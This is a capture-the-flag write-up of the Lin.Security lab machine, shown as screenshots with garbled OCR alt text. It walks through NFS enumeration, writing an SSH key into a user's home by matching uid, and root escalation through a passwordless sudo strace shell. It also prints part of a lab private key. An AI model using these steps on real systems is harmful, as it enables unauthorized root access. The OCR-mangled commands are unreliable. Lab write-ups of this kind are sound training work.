# Lin.Security
06 April 2022
06:20 PM

<img src="Lin.Security/media/image1.png" style="width:6.225in;height:5.04167in" alt="PORT 22/tcp VERSION openSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) I ssh-hostkey: 2048 (RSA) 256 (ECDSA) 256 (ED25519) Ill/tcp open rpcbind 2-4 (wc #løoøøø) STATE SERVICE open ssh rpcinfo: program løøøøo løøøøø løøøøo løøøøø 100003 100003 100003 100003 1øøøø5 100005 100005 1øøøø5 100021 100021 100021 100021 100227 100227 100227 100227 version 2, 3 3 1,2,3 1,2,3 1,2,3 1,2,3 1, 1, 1, 3 3 3 3 port/proto Ill/tcp Ill/udp 111/tcp6 111/udp6 2049/udp 2049/udp6 2049/tcp 2049/tcp6 44843/tcp 52491/udp 54367/tcp6 56544/udp6 40101/udp 41235/tcp 44345/tcp6 58068/udp6 2049/tcp 2049/tcp6 2049/udp 2049/udp6 service rpcbind rpcbind rpcbind rpcbind nfs nfs nfs nfs mountd mountd mountd mountd n lockmgr nlockmgr nlockmgr nlockmgr nfs act nfs act nfs act nfs act 2049/tcp open nfs act 3 (RPC #100227) " />

<img src="Lin.Security/media/image2.png" style="width:6.33333in;height:1.85in" alt="2049/tcp 39021/tcp 41235/tcp 44843/tcp 56873/tcp open open open open open nfs act rpcbind nlockmgr mountd rpcbind Service Info: OS: Linux; (RPC #100227) 3 1-4 (RPC #100021) 1-3 (RPC #100005) CPE: cpe:/o:linux:linux_kernel NSE : Scri t Post-scanning. " />

<img src="Lin.Security/media/image3.png" style="width:6.3in;height:2.73333in" />

<img src="Lin.Security/media/image4.png" style="width:6.13333in;height:2.29167in" />

<img src="Lin.Security/media/image5.png" style="width:6.575in;height:2.66667in" alt="total 32 drwxr-xr-x 5 drwxr -rw-r r- -rw-r--r drwx (roote /home/kal i/Desktop/ctf/peter -xr-x 16 -rw-rw-r-- drwx drwxrwxr-x -rw-r--r-- 1 1 2 1 3 3 1 1001 kali 1001 1001 1001 1001 1001 1001 1001 1005 kali 1005 1005 1005 1005 1005 1005 1005 4096 4096 220 3771 4096 4096 4096 807 Jul Apr Jul Jul Jul Jul Jul Jul Jul 10 6 9 9 10 10 10 10 9 2018 09:17 2018 2018 2018 2018 2018 2018 2018 .bash_logout . bashrc . cache . cloud-locale-test. skip . gnupg . local . profile " />

<img src="Lin.Security/media/image6.png" style="width:6.54167in;height:4.5in" alt="/home/kaIi/Desktop/ctf/peter Cg groupadd --gid 1005 peter /home/ka1i/Desktop/ctf/peter n useradd -u 1001 1005 peter -g /home/kal i/Desktop/ctf/peter 1—&#39;1 cat /etc/passwd I grep peter /home/o :/bin/sh /home/kal i/Desktop/ctf/peter Lo su peter $ Is -la total 32 drwxr drwxr-xr-x 16 -rw-r--r -rw-r--r-- drwx -rw-rw-r-- drwx drwxrwxr -x -rw-r r -- 1 1 2 1 3 3 1 peter kali peter peter peter peter peter peter peter peter kali peter peter peter peter peter peter peter 4096 4096 220 3771 4096 4096 4096 807 Jul Apr Jul Jul Jul Jul Jul jul 10 6 9 9 10 10 10 10 9 2018 . 09&#39;.17 . . bash_logout 2018 . bashrc 2018 . cache 2018 . cloud-locale-test . skip 2018 2018 . gnupg . local 2018 . profile 2018 " />

<img src="Lin.Security/media/image7.png" style="width:6.575in;height:4.425in" alt="$ mkdir . ssh $ cd .ssh $ pwd /home/kali/Desktop/ct f/peter/. ssh $ ssh-keygen -t rsa -b 4096 -C &#39;drtöhtb&#39; -f internals. pub -P Generating public/private rsa key pair. Your identification has been saved in internals. pub Your public key has been saved in internals.pub.pub The key fingerprint is: SHA256:/b7Bwe+j70q3TXjbgvq1X9EkøKNM8sB2Xwf3rUf3ch1 drtahtb The key&#39;s randomart image is: = 0.0 0+1 +— [SHA256] cat internals. pub.pub I tee authorized_keys 88 chmod 600 authorized_keys " />

<img src="Lin.Security/media/image8.png" style="width:6.46667in;height:2.70833in" alt="$ cat internals. pub. pub I tee authorized_keys 88 chmod 600 authorized _ keys ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC5qhhtD3drPekR6WNHt972+/sVVP1cn1j1R/p1rQwqAhtY+1S4Y540XXMHNW DITSVRFZ+tyuDEdCUBCFWY501AoptOi6ThCPjKhT/kJKqhdZJnF9U9kYbJ5kJcczwvedaØgiNr4x4wzweNTAu37kUTqXQLlC3e4 ccWKGmFrEefqPDjhjgiuuocsBwH9BYjy4cd+izuH2eGms6XV3DHjYOWQadD361yrwQ1qsccwmorZ6GW8v1sUTksFkpiz3si081 PHxiq8ØZTywyItmc/KUV Em9j RR+t3vi40H JbT8JHZAFEbyAi081 RwohvrucnlJAWKMj BQ65Xcyj hw5Bukt IYØ3StzPZsnTtBL8M Ga4QybODKRn/1MHZLn6Aeb4vuQdug1TMCQOWX05S1edØ612VGFeTJji6niNIUXBl&lt;u3Uyxq3YGHLuwrFsjDxdwon3zxsosrtA11J 09:35 09 : 32 drtöhtb $ Is -la total 20 drwxr-xr-x 2 peter peter drwxr-xr-x 6 peter peter -rw -rw 1 peter peter 1 peter peter 4096 Apr 4096 Apr 733 Apr 3369 Apr 733 Apr 6 6 6 6 6 1 peter peter -rw-r -- r -- $ cat internals. pub 09 : 35 authorized _ keys 09:35 internals.pub 09 : 35 internals. pub. pub BEGIN OPENSSH PRIVATE KEY b3B1bnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn NhAAAAAwEAAQAAAgEAua0YbQ93aZ3PEe1jR7fe9VV7FVT9XJ5YYEf6SKØMKg1bCVPUuGOe D11ZBzvnP7/ctrmWPSZ3H4h8ZRAFLbT12PYMAbUKLlYCSJm1K18P1avg9UørøRWfPWLgxHQ " />

<img src="Lin.Security/media/image9.png" style="width:6.30833in;height:1.275in" alt="ni cRbW9Tpffv9j sPi/yBR7e7Kz96VoOhBQmMCzD5x6QQ5UFq+Iw5b4arIJaXTnef1 f LndL t z psniWRrAZQMNIXNi0Hxsdbpm6h3WR131 F L lwzdwrR+rSVB9GaLED1gRZNXGMt/01gxpØ +d43AbuCciWaC4Q3tPquPqa4WDMWsG1mbr/GUgLF+Lu2Js/7fQzGdØgAHu97R3ØN8dtBvk L6810Q+6+iCAAAAHZHJØQGhØYgECAWQ= END OPENSSH PRIVATE KEY $ exit " />

<img src="Lin.Security/media/image10.png" style="width:4.04167in;height:0.78333in" alt="(kaliS kali —/Desktop/ctf $ nano internals.pub " />

<img src="Lin.Security/media/image11.png" style="width:6.175in;height:2.34167in" />

<img src="Lin.Security/media/image12.png" style="width:5.90833in;height:1.95in" alt="sudo -l Matching Defaults entries for peter on I insecurity: env_reset, mail_badpass, User peter may run the following commands on linsecuri (ALL) NOPASSWD: /usr/bin/strace peteratinsecurity : -$ " />

<img src="Lin.Security/media/image13.png" style="width:7.20833in;height:1.525in" alt="Sudo If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access. sudo &#39;trace -o /dev/nuU /bin/5h " />

<img src="Lin.Security/media/image14.png" style="width:5.83333in;height:0.64167in" alt="peterNinsecurity:-$ sudo /usr/bin/strace -o /dev/null /bin/sh # id " />

<img src="Lin.Security/media/image15.png" style="width:1.36667in;height:0.54167in" alt="whoami root " />